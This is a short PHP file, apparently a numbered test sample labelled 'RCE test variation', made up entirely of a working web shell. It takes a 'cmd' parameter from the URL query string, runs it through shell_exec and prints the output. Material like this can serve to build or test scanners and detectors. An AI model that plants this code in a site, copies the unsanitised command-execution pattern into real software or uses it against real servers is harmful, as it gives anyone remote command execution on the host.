<?php
// RCE test variation #1465
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>